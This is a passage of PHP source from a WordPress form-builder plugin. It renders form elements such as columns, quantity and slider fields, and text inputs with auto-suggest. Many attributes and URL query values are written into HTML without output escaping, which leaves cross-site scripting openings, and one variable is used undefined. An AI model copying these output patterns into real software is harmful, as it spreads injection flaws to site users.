<?php
/**
 * Super Forms Common Class.
 *
 * @author      feeling4design
 * @category    Class
 * @package     SUPER_Forms/Classes
 * @class       SUPER_Shortcodes
 * @version     1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

if( !class_exists( 'SUPER_Shortcodes' ) ) :

/**
 * SUPER_Shortcodes
 */
class SUPER_Shortcodes {
        
    /** 
     *  All the fields
     *
     *  Create an array with all the fields
     *
     *  @since      1.0.0
    */
    public static function shortcodes( $shortcode=false, $attributes=false, $content=false ) {
        
        $attributes = stripslashes_deep($attributes);

        $attr = array( 
            'shortcode'=>$shortcode, 
            'attributes'=>$attributes, 
            'content'=>$content 
        );
            
        include( 'shortcodes/predefined-arrays.php' );
        
        $array = array();
        
        $array = apply_filters( 'super_shortcodes_start_filter', $array, $attr );
        
        /** 
         *  Layout Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/layout-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_layout_elements_filter', $array, $attr );

        
        /** 
         *  Form Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/form-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_form_elements_filter', $array, $attr );
        
        
        /** 
         *  Price Elements
         *
         *  @since      1.0.0
        */
        include( 'shortcodes/price-elements.php' );
        $array = apply_filters( 'super_shortcodes_after_price_elements_filter', $array, $attr );
        
        $array = apply_filters( 'super_shortcodes_end_filter', $array, $attr );

        return $array;
        
    }
    
    /** 
     *  Output the element HTML on the builder page (create form) inside the preview area
     *
     * @param  string  $tag
     *
     *  @since      1.0.0
    */
    public static function output_builder_html( $tag, $group, $data, $inner, $shortcodes=null, $settings=null ) {
        
        if( $shortcodes==null ) {
            $shortcodes = self::shortcodes();
        }

        if( !isset( $shortcodes[$group]['shortcodes'][$tag] ) ) {
            return '';
        }

        $name = $shortcodes[$group]['shortcodes'][$tag]['name'];

        if(count($data)==0){
            $fields = array();
            foreach( $shortcodes[$group]['shortcodes'][$tag]['atts'] as $k => $v ) {
                if( isset( $v['fields'] ) ) {
                    foreach( $v['fields'] as $vk => $vv ) {
                        if( ($vv['default']!=='') && ($vv['default']!==0) ) {
                            $fields[$vk] = $vv['default'];
                        }
                    }
                }
            }
            $data = $fields;
        }else{
            $data = $data;
        }

        $data = json_decode(json_encode($data), true);
        $inner = json_decode(json_encode($inner), true);
   
        $class = '';
        $inner_class = '';

        if($tag=='column'){
            $sizes = array(
                '1/5'=>array('one_fifth',20),
                '1/4'=>array('one_fourth',25),
                '1/3'=>array('one_third',33.3333334),
                '2/5'=>array('two_fifth',40),
                '1/2'=>array('one_half',50),
                '3/5'=>array('three_fifth',60),
                '2/3'=>array('two_third',66.6666667),
                '3/4'=>array('three_fourth',75),
                '4/5'=>array('four_fifth',80),
                '1/1'=>array('one_full',100),
            ); 
            $class .= ' super_'.$sizes[$data['size']][0] . ' super-' . str_replace( 'column_', 'super_', $tag );
        }
        if($tag=='multipart'){
            $class .= ' ' . $tag;
        }
  
        if( isset( $shortcodes[$group]['shortcodes'][$tag]['drop'] ) ) {
            $class .= ' drop-here';
            $inner_class .= ' super-dropable';
        }
        
        if( !isset( $data['minimized'] ) ) $data['minimized'] = 'no';
        if($data['minimized']=='yes'){
            $class .= ' super-minimized';
        }
        $result = '';
        $result .= '<div class="super-element' . $class . '" data-shortcode-tag="' . $tag . '" data-group="'.$group.'" data-minimized="' . $data['minimized'] . '" ' . ( $tag=='column' ? 'data-size="' . $data['size'] . '"' : '' ) . '>';
            $result .= '<div class="super-element-header">';
                if($tag=='column'){
                    $result .= '<div class="resize popup" data-content="Change Column Size">';
                        $result .= '<span class="smaller"><i class="fa fa-angle-left"></i></span>';
                        $result .= '<span class="current">' . $data['size'] . '</span><span class="bigger"><i class="fa fa-angle-right"></i></span>';
                    $result .= '</div>';
                }else{
                    $result .= '<div class="super-title">' . $name . '</div>';
                }
                $result .= '<div class="super-element-actions">';
                    $result .= '<span class="edit popup" title="Edit element"><i class="fa fa-pencil"></i></span>';
                    $result .= '<span class="duplicate popup" title="Duplicate element"><i class="fa fa-files-o"></i></span>';
                    $result .= '<span class="move popup" title="Reposition element"><i class="fa fa-arrows"></i></span>';
                    $result .= '<span class="minimize popup" title="Minimize"><i class="fa fa-minus-square-o"></i></span>';
                    $result .= '<span class="delete popup" title="Delete"><i class="fa fa-times"></i></span>';
                $result .= '</div>';
            $result .= '</div>';
            $result .= '<div class="super-element-inner' . $inner_class . '">';
                if( ( $tag!='column' ) && ( $tag!='multipart' ) ) {
                    $result .= self::output_element_html( $tag, $group, $data, $inner, $shortcodes, $settings );
                }
                if( !empty( $inner ) ) {
                    foreach( $inner as $k => $v ) {
                        $result .= self::output_builder_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                    }
                }
            $result .= '</div>';
            $result .= '<textarea name="element-data">' . json_encode( $data ) . '</textarea>';
        $result .= '</div>';
        
        return $result;
        
    }

    public static function opening_tag( $tag, $atts, $class='', $styles='' ) {        
        $style = '';
        if($tag=='divider') $atts['width'] = 0;
        if( !isset( $atts['width'] ) ) $atts['width'] = 0;
        if( $atts['width']!=0 ) $style .= 'width:' . $atts['width'] . 'px;';
        if( !empty( $atts['tooltip'] ) ) {
            wp_enqueue_style('super-tooltips', SUPER_PLUGIN_FILE.'assets/css/backend/tooltips.min.css', array(), SUPER_VERSION);    
            wp_enqueue_script('super-tooltips', SUPER_PLUGIN_FILE.'assets/js/backend/tooltips.min.js', array(), SUPER_VERSION);   
        }
        $result = '<div';
        if( ( $style!='' ) || ( $styles!='' ) ) $result .= ' style="' . $style . $styles . '"';
        $result .= ' class="super-shortcode super-field super-' . $tag;

        $align = '';
        if( isset( $atts['align'] ) ) $align = ' super-align-' . $atts['align'];
        $result .= $align;

        if( !empty( $atts['tooltip'] ) ) $result .= ' popup';
        if( !isset( $atts['error_position'] ) ) $atts['error_position'] = '';
        $result .= ' ' . $atts['error_position'];
        //if(($tag=='super_checkbox') || ($tag=='super_radio') || ($tag=='super_shipping')) $result .= ' display-'.$display;
        if( !isset( $atts['grouped'] ) ) $atts['grouped'] = 0;
        if($atts['grouped']==0) $result .= ' ungrouped ';
        if($atts['grouped']==1) $result .= ' grouped ';
        if($atts['grouped']==2) $result .= ' grouped grouped-end ';
        $result .= ' ' . $class . '"';
        if( !empty( $atts['tooltip'] ) ) $result .= ' title="' . esc_attr( stripslashes( $atts['tooltip'] ) ) . '"';
        $result .= self::conditional_attributes( $atts );
        $result .= '>';
        if( !isset( $atts['label'] ) ) $atts['label'] = '';
        if( $atts['label']!='' ) {
            $bottom_margin = false;
            if( $atts['description']=='' ) {
                $bottom_margin = true;
            }
            $result .= self::field_label( $atts['label'], $bottom_margin );
        }
        if( !isset( $atts['description'] ) ) $atts['description'] = '';
        if( $atts['description']!='' ) {
            $result .= self::field_description( $atts['description'] );
        }
        return $result;
    }
    public static function conditional_attributes( $atts ) {        
        if( !isset( $atts['conditional_action'] ) ) $atts['conditional_action'] = 'disabled';
        if( !isset( $atts['conditional_trigger'] ) ) $atts['conditional_trigger'] = 'all';
        if( $atts['conditional_action']!='disabled' ) {
            return ' data-conditional_action="' . $atts['conditional_action'] . '" data-conditional_trigger="' . $atts['conditional_trigger'] . '"';
        }
    }
    public static function field_label( $label, $bottom_margin ) {        
        $class = '';
        if( $bottom_margin==true ) $class = ' super-bottom-margin';
        return '<div class="super-label' . $class . '">' . $label . '</div>';
    }
    public static function field_description( $description ) {        
        return '<div class="super-description">' . $description . '</div>';
    }        
    public static function opening_wrapper( $atts=array(), $inner=array(), $shortcodes=null, $settings=null ) {
        if( !isset( $atts['icon'] ) ) $atts['icon'] = '';
        if( !isset( $atts['icon_position'] ) ) $atts['icon_position'] = 'outside';
        if( !isset( $atts['icon_align'] ) ) $atts['icon_align'] = 'left';
        if( !isset( $atts['wrapper_width'] ) ) $atts['wrapper_width'] = '';
        $style = '';
        if( !isset( $atts['wrapper_width'] ) ) $atts['wrapper_width'] = 0;
        if( $atts['wrapper_width']!=0 ) {
            $style = 'width:' . $atts['wrapper_width'] . 'px;';
        }
        if( !empty( $style ) ) {
            $style = ' style="' . $style . '"';
        }
        if( ( isset( $settings['theme_hide_icons'] ) ) && ( $settings['theme_hide_icons']=='yes' ) ) {
            $atts['icon'] = '';
        }
        $result = '<div' . $style . ' class="super-field-wrapper ' . ( $atts['icon']!='' ? 'super-icon-' . $atts['icon_position'] . ' super-icon-' . $atts['icon_align'] : '' ) . '">';
        if($atts['icon']!=''){
            $result .= '<i class="fa fa-'.$atts['icon'].' super-icon"></i>';
        }
        return $result;
    }
    public static function common_attributes( $atts, $tag ) {        
        if( !isset( $atts['error'] ) ) $atts['error'] = '';
        if( !isset( $atts['validation'] ) ) $atts['validation'] = '';
        if( !isset( $atts['conditional_validation'] ) ) $atts['conditional_validation'] = '';
        if( !isset( $atts['conditional_validation_value'] ) ) $atts['conditional_validation_value'] = '';
        if( !isset( $atts['may_be_empty'] ) ) $atts['may_be_empty'] = 'false';
        if( !isset( $atts['email'] ) ) $atts['email'] = '';
        if( !isset( $atts['exclude'] ) ) $atts['exclude'] = 0;
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        $result = ' data-message="' . $atts['error'] . '" data-validation="'.$atts['validation'].'" data-may-be-empty="'.$atts['may_be_empty'].'" data-conditional-validation="'.$atts['conditional_validation'].'" data-conditional-validation-value="'.$atts['conditional_validation_value'].'" data-email="'.$atts['email'].'" data-exclude="'.$atts['exclude'].'"';
        
        // disabled     @ since v1.2.2
        if( !isset( $atts['disabled'] ) ) $atts['disabled'] = ''; 
        if( !empty( $atts['disabled'] ) ) $result .= ' disabled="' . $atts['disabled'] . '"';

        if( !empty( $atts['placeholder'] ) ) {
            $result .= ' placeholder="' . $atts['placeholder'] . '"';
        }
        if($tag=='file'){
            if( $atts['minlength']>0 ) {
                $result .= ' data-minfiles="' . $atts['minlength'] . '"';
            }
            if( $atts['maxlength']>0 ) {
                $result .= ' data-maxfiles="' . $atts['maxlength'] . '"';
            }
        }elseif( $tag=='product' ) {
            if( $atts['maxlength']>0 ) {
                $result .= ' max="' . $atts['maxlength'] . '" data-maxlength="' . $atts['maxlength'] . '"';
            }
            $result .= ' min="' . $atts['minlength'] . '" data-minlength="' . $atts['minlength'] . '"';
        }elseif( ($tag=='dropdown') || ($tag=='checkbox') || ($tag=='radio') ) {
            // @since 1.2.7
            if( !isset( $atts['admin_email_value'] ) ) $atts['admin_email_value'] = 'value';
            if( !isset( $atts['confirm_email_value'] ) ) $atts['confirm_email_value'] = 'value';
            $result .= ' data-admin-email-value="' . $atts['admin_email_value'] . '"';
            $result .= ' data-confirm-email-value="' . $atts['confirm_email_value'] . '"';
        }else{
            if($tag=='date'){
                if( $atts['maxlength']!='' ) {
                    $result .= ' data-maxlength="' . $atts['maxlength'] . '"';
                }
                if( $atts['minlength']!='' ) {
                    $result .= ' data-minlength="' . $atts['minlength'] . '"';
                }
            }else{
                if( $atts['maxlength']>0 ) {
                    $result .= ' data-maxlength="' . $atts['maxlength'] . '"';
                }
                if( $atts['minlength']>0 ) {
                    $result .= ' data-minlength="' . $atts['minlength'] . '"';
                }
            }

            if( !isset( $atts['maxnumber'] ) ) $atts['maxnumber'] = 0;
            if( !isset( $atts['minnumber'] ) ) $atts['minnumber'] = 0;
            if( $atts['maxnumber']>0 ) {
                $result .= ' data-maxnumber="' . $atts['maxnumber'] . '"';
            }
            if( $atts['minnumber']>0 ) {
                $result .= ' data-minnumber="' . $atts['minnumber'] . '"';
            }
        }
        return $result;
    }

    // @since 1.2.5     - custom regex validation
    public static function custom_regex( $regex ) {
        return '<textarea disabled class="super-custom-regex">' . $regex . '</textarea>';
    }

    public static function loop_conditions( $atts ) {
        if( !isset( $atts['conditional_action'] ) ) $atts['conditional_action'] = 'disabled';
        if( !isset( $atts['conditional_items'] ) ) $atts['conditional_items'] = '';
        if( ( $atts['conditional_items']!=null ) && ( $atts['conditional_action']!='disabled' ) ) {
            $items = '';
            foreach( $atts['conditional_items'] as $k => $v ) {
                
                // @since 1.2.2
                if( !isset( $v['and_method'] ) ) $v['and_method'] = '';
                if( !isset( $v['field_and'] ) ) $v['field_and'] = '';
                if( !isset( $v['logic_and'] ) ) $v['logic_and'] = '';
                if( !isset( $v['value_and'] ) ) $v['value_and'] = '';

                $items .= '<div hidden class="super-conditional-logic" data-field="' . $v['field'] . '" data-logic="' . $v['logic'] . '" data-value="' . $v['value'] . '" data-and-method="' . $v['and_method'] . '" data-field-and="' . $v['field_and'] . '" data-logic-and="' . $v['logic_and'] . '" data-value-and="' . $v['value_and'] . '"></div>';
            }
            return $items;
        }
    }


    /** 
     *  Callback functions for each element to output the HTML
     *
     * @param  string  $tag
     * @param  string  $group
     * @param  array   $data
     *
     *  @since      1.0.0
    */
    public static function multipart( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        
        // @since 1.2.3
        if( !isset( $atts['auto'] ) ) $atts['auto'] = 'no';

        $result  = '';
        $result .= '<div class="super-shortcode super-' . $tag . '" data-step-auto="' . $atts['auto'] .'" data-step-name="' . $atts['step_name'] .'" data-step-description="' . $atts['step_description'] . '"';
        
        // @since 1.2.5
        if( isset( $atts['prev_text'] ) ) $result .= ' data-prev-text="' . $atts['prev_text'] . '"';
        if( isset( $atts['next_text'] ) ) $result .= ' data-next-text="' . $atts['next_text'] . '"';
        
        $result .= ' data-icon="' . $atts['icon'] . '">';
        if( !empty( $inner ) ) {
            // Before doing the actuall loop we need to know how many columns this form contains
            // This way we can make sure to correctly close the column system
            $GLOBALS['super_column_found'] = 0;
            foreach( $inner as $k => $v ) {
                if( $v['tag']=='column' ) $GLOBALS['super_column_found']++;
            }
            foreach( $inner as $k => $v ) {
                $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
            }
        }
        unset($GLOBALS['super_grid_system']);
        $result .= '</div>';
        return $result;
    }
    public static function column( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result  = '';
        $sizes = array(
            '1/5'=>array('one_fifth',20),
            '1/4'=>array('one_fourth',25),
            '1/3'=>array('one_third',33.3333334),
            '2/5'=>array('two_fifth',40),
            '1/2'=>array('one_half',50),
            '3/5'=>array('three_fifth',60),
            '2/3'=>array('two_third',66.6666667),
            '3/4'=>array('three_fourth',75),
            '4/5'=>array('four_fifth',80),
            '1/1'=>array('one_full',100),
        );

        // @since   1.1.7    - make sure this data is set
        if( !isset( $atts['duplicate'] ) ) $atts['duplicate'] = '';

        // @since   1.2.2    - make sure this data is set
        if( !isset( $atts['invisible'] ) ) $atts['invisible'] = '';
        if($atts['invisible']=='true') $atts['invisible'] = ' super-invisible';

        // Make sure our global super_grid_system is set
        if( !isset( $GLOBALS['super_grid_system'] ) ) {
            $GLOBALS['super_grid_system'] = array(
                'level' => 0,
                'width' => 0,
                'columns' => array()
            );
        }
        $grid = $GLOBALS['super_grid_system'];
        if( $grid['level']==0 ) {
            if( !isset( $grid['columns'][$grid['level']]['total'] ) ) $GLOBALS['super_grid_system']['columns'][$grid['level']]['total'] = $GLOBALS['super_column_found'];
        }
        if( !isset( $grid['columns'][$grid['level']]['current'] ) ) $GLOBALS['super_grid_system']['columns'][$grid['level']]['current'] = 0;
        if( !isset( $grid[$grid['level']]['width'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['width'] = 0;
        if( !isset( $grid[$grid['level']]['opened'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['opened'] = 0;
        if( !isset( $grid[$grid['level']]['closed'] ) ) $GLOBALS['super_grid_system'][$grid['level']]['closed'] = 0;

        // Before setting the global grid system variable count the inner columns
        if( !isset( $grid['columns'][$grid['level']]['inner_total'] ) ) {
            $inner_total = 0;
            if( !empty( $inner ) ) {
                foreach( $inner as $k => $v ) {
                    if( $v['tag']=='column' ) $inner_total++;
                }
            }
            $GLOBALS['super_grid_system']['columns'][$grid['level']]['inner_total'] = $inner_total;
        }
        $grid = $GLOBALS['super_grid_system'];

        // This is the first column of the grid
        $grid['columns'][$grid['level']]['current']++;
        if( $grid['columns'][$grid['level']]['current']==1 ) {
            
            $result .= '<div class="super-grid super-shortcode">';
            $grid[$grid['level']]['opened']++;
            $grid[$grid['level']]['width'] = floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1]);
            
            // Output the column and it's inner content
            $class = 'first-column';
            $result .= '<div class="super-shortcode super_' . $sizes[$atts['size']][0] . ' super-column'.$atts['invisible'].' column-number-'.$grid['columns'][$grid['level']]['current'].' grid-level-'.$grid['level'].' ' . $class . ' ' . $atts['margin'] . '"'; 
            $result .= self::conditional_attributes( $atts );
            $result .= '>';
            if( !empty( $inner ) ) {
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-shortcode super-duplicate-column-fields">';
                }
                $grid['level']++;
                $GLOBALS['super_grid_system'] = $grid;
                foreach( $inner as $k => $v ) {
                    $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                }
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-duplicate-actions">';
                    $result .= '<span class="super-add-duplicate"></span>';
                    $result .= '<span class="super-delete-duplicate"></span>';
                    $result .= '</div>';
                    $result .= '</div>';
                }
                $grid['level']--;
                $GLOBALS['super_grid_system'] = $grid;      
            }
            $result .= self::loop_conditions( $atts );
            $result .= '</div>';

            if( $sizes[$atts['size']][1]==100 ) {
                $grid['columns'][$grid['level']]['current'] = 0;
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;
                if( $grid['level']==0 ) {
                    $unset_global = true;
                }
            }
            $GLOBALS['super_grid_system'] = $grid;
            
        }else{

            $class = '';
            if( ($grid[$grid['level']]['width']<100) && (floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1])>100) ) {
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;

                $result .= '<div class="super-grid super-shortcode">';
                $grid['columns'][$grid['level']]['current'] = 1;
                $class = 'first-column';

                $grid[$grid['level']]['opened']++;
            }

            $grid[$grid['level']]['width'] = floor($grid[$grid['level']]['width']+$sizes[$atts['size']][1]);
            
            // Output the column and it's inner content
            $result .= '<div class="super-shortcode super_' . $sizes[$atts['size']][0] . ' super-column'.$atts['invisible'].' column-number-'.$grid['columns'][$grid['level']]['current'].' grid-level-'.$grid['level'].' ' . $class . ' ' . $atts['margin'] . '"'; 
            $result .= self::conditional_attributes( $atts );
            $result .= '>';
            if( !empty( $inner ) ) {
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-shortcode super-duplicate-column-fields">';
                }
                $grid['level']++;
                $GLOBALS['super_grid_system'] = $grid;
                foreach( $inner as $k => $v ) {
                    $result .= self::output_element_html( $v['tag'], $v['group'], $v['data'], $v['inner'], $shortcodes, $settings );
                }
                if( $atts['duplicate']=='enabled' ) {
                    $result .= '<div class="super-duplicate-actions">';
                    $result .= '<span class="super-add-duplicate"></span>';
                    $result .= '<span class="super-delete-duplicate"></span>';
                    $result .= '</div>';
                    $result .= '</div>';
                }
                $grid['level']--;
                $GLOBALS['super_grid_system'] = $grid;
            }
            $result .= self::loop_conditions( $atts );
            $result .= '</div>';

            if( ( $sizes[$atts['size']][1]==100 ) || ( $grid[$grid['level']]['width']>=95 ) ) {
                $grid['columns'][$grid['level']]['current'] = 0;
                $grid[$grid['level']]['width'] = 0;
                $result .= '</div>';
                $grid[$grid['level']]['closed']++;
            }
            $GLOBALS['super_grid_system'] = $grid;
        }

        // Before returning the result, make sure we check for missing closures of the grid
        if( isset($grid['columns'][$grid['level']]['total']) ) {
            if( $grid['columns'][$grid['level']]['total']==$grid['columns'][$grid['level']]['current'] ) {
                if( $grid[$grid['level']]['closed'] < $grid[$grid['level']]['opened'] ) {
                    $result .= '</div>';
                }
            }
        }else{
            $level = $grid['level']-1;
            if( $grid['columns'][$level]['inner_total']==$grid['columns'][$grid['level']]['current'] ) {
                if( $grid[$grid['level']]['closed'] < $grid[$grid['level']]['opened'] ) {
                    $result .= '</div>';
                }
            }
        }
        if( isset( $unset_global ) ) {
            if( $unset_global==true ) {
                unset($GLOBALS['super_grid_system']);
            }
        }
        return $result;

    }

    /** 
     *  Quantity field
     *
     * @param  string  $tag
     * @param  array  $atts
     *
     *  @since      1.2.1
    */    
    public static function quantity_field( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $atts['validation'] = 'numeric';
        if( (!isset($atts['wrapper_width'])) || ($atts['wrapper_width']==0) ) $atts['wrapper_width'] = 50;
        $result = self::opening_tag( $tag, $atts );
        $result .= '<span class="super-minus-button super-noselect"><i>-</i></span>';
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field" type="text"';
        if( isset( $_GET[$atts['name']] ) )  $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) $atts['value'] = '';
        if( ( !isset( $atts['minnumber'] ) ) || ( $atts['minnumber']=='' ) ) $atts['minnumber'] = 0;
        if( ( !isset( $atts['maxnumber'] ) ) || ( $atts['maxnumber']=='' ) ) $atts['maxnumber'] = 100;
        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '" data-steps="' . $atts['steps'] . '" data-minnumber="' . $atts['minnumber'] . '" data-maxnumber="' . $atts['maxnumber'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= '<span class="super-plus-button super-noselect"><i>+</i></span>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    /** 
     *  Slider element
     *
     * @param  string  $tag
     * @param  array  $atts
     *
     *  @since      1.2.1
    */    
    public static function slider_field( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_style('super-simpleslider', SUPER_PLUGIN_FILE.'assets/css/backend/simpleslider.min.css', array(), SUPER_VERSION);    
        wp_enqueue_script('super-simpleslider', SUPER_PLUGIN_FILE.'assets/js/backend/simpleslider.min.js', array(), SUPER_VERSION); 
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field" type="text"';
        if( isset( $_GET[$atts['name']] ) )  $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) $atts['value'] = '';
        if( ( !isset( $atts['minnumber'] ) ) || ( $atts['minnumber']=='' ) ) $atts['minnumber'] = 0;
        if( ( !isset( $atts['maxnumber'] ) ) || ( $atts['maxnumber']=='' ) ) $atts['maxnumber'] = 100;
        
        if( !isset( $atts['format'] ) ) $atts['format'] = '';

        // @since 1.2.2
        if( !isset( $atts['currency'] ) ) $atts['currency'] = '';
        if( !isset( $atts['decimals'] ) ) $atts['decimals'] = 2;
        if( !isset( $atts['thousand_separator'] ) ) $atts['thousand_separator'] = ',';
        if( !isset( $atts['decimal_separator'] ) ) $atts['decimal_separator'] = '.';

        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '" data-decimals="' . $atts['decimals'] . '" data-thousand-separator="' . $atts['thousand_separator'] . '" data-decimal-separator="' . $atts['decimal_separator'] . '" data-steps="' . $atts['steps'] . '" data-currency="' . $atts['currency'] . '" data-format="' . $atts['format'] . '" data-minnumber="' . $atts['minnumber'] . '" data-maxnumber="' . $atts['maxnumber'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    public static function text( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        
        // @since   1.2.4   - auto suggest feature
        if( !isset( $atts['enable_auto_suggest'] ) ) $atts['enable_auto_suggest'] = '';
        $class = ($atts['enable_auto_suggest']=='true' ? 'super-auto-suggest' : '');

        $result = self::opening_tag( $tag, $atts, $class );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        $result .= '<input class="super-shortcode-field" type="text"';

        // @since   1.1.8   - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since   1.0.6   - make sure this data is set
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) {
            $atts['value'] = '';
        }else{
            $atts['value'] = SUPER_Common::email_tags( $atts['value'] );
        }

        if( $atts['enable_auto_suggest']=='true' ) {
            $items = array();
            if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
            if( $atts['retrieve_method']=='custom' ) {
                if( ( isset( $atts['autosuggest_items'] ) ) && ( count($atts['autosuggest_items'])!=0 ) && ( $atts['autosuggest_items']!='' ) ) {
                    foreach( $atts['autosuggest_items'] as $k => $v ) {
                        if( $v['checked']=='true' ) {
                            $atts['value'] = $v['value'];
                            if( $placeholder=='' ) {
                                $placeholder .= $v['label'];
                            }else{
                                $placeholder .= ', ' . $v['label'];
                            }
                            $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" data-search-value="' . esc_attr( $v['label'] ) . '" class="selected">' . $v['label'] . '</li>'; 
                        }else{
                            $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" data-search-value="' . esc_attr( $v['label'] ) . '">' . $v['label'] . '</li>'; 
                        }
                    }
                }
            }      
            if($atts['retrieve_method']=='taxonomy') {
                if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
                if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
                if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
                if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
                
                $args = array(
                    'hide_empty' => $atts['retrieve_method_hide_empty'],
                    'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                    'taxonomy' => $atts['retrieve_method_taxonomy'],
                    'parent' => $atts['retrieve_method_parent'],
                );
                $categories = get_categories( $args );
                foreach( $categories as $v ) {
                    
                    // @since 1.2.5
                    if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                    if($atts['retrieve_method_value']=='slug'){
                        $data_value = $v->slug;
                    }elseif($atts['retrieve_method_value']=='id'){
                        $data_value = $v->ID;
                    }else{
                        $data_value = $v->name;
                    }
                    $items[] = '<li data-value="' . esc_attr($data_value) . '" data-search-value="' . esc_attr( $v->name ) . '">' . $v->name . '</li>'; 
                }
            }
            // @since   1.2.4
            if($atts['retrieve_method']=='post_type') {
                if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
                if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
                if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
                $args = array(
                    'post_type' => $atts['retrieve_method_post'],
                    'exclude' => $atts['retrieve_method_exclude_post'],
                    'post_parent' => $atts['retrieve_method_parent'],
                    'posts_per_page'=>-1, 
                    'numberposts'=>-1
                );
                $posts = get_posts( $args );
                foreach( $posts as $v ) {
                    
                    // @since 1.2.5
                    if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                    if($atts['retrieve_method_value']=='slug'){
                        $data_value = $v->post_name;
                    }elseif($atts['retrieve_method_value']=='id'){
                        $data_value = $v->ID;
                    }else{
                        $data_value = $v->post_title;
                    }
                    $items[] = '<li data-value="' . esc_attr($data_value) . '" data-search-value="' . esc_attr( $v->post_title ) . '">' . $v->post_title . '</li>'; 
                }
            }
            if($atts['retrieve_method']=='csv') {
                
                // @since   1.2.5
                $delimiter = ',';
                $enclosure = '"';
                if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
                if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);

                $file = get_attached_file($atts['retrieve_method_csv']);
                if($file){
                    $row = 1;
                    if (($handle = fopen($file, "r")) !== FALSE) {
                        while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                            $num = count($data);
                            $row++;
                            $value = 'undefined';
                            $title = 'undefined';
                            for ( $c=0; $c < $num; $c++ ) {
                                if( $c==0) $value = $data[$c];
                                if( $c==1 ) $title = $data[$c];

                            }
                            if( $title=='undefined' ) {
                                $title = $value; 
                            }
                            $items[] = '<li data-value="' . esc_attr( $value ) . '" data-search-value="' . esc_attr( $title ) . '">' . $title . '</li>';
                        }
                        fclose($handle);
                    }
                }
            }
        }
        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';
        
        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        // @since 1.2.4
        if( $atts['enable_auto_suggest']=='true' ) {
            $result .= '<ul class="super-dropdown-ui">';
            foreach( $items as $v ) {
                $result .= $v;
            }
            $result .= '</ul>';
        }

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
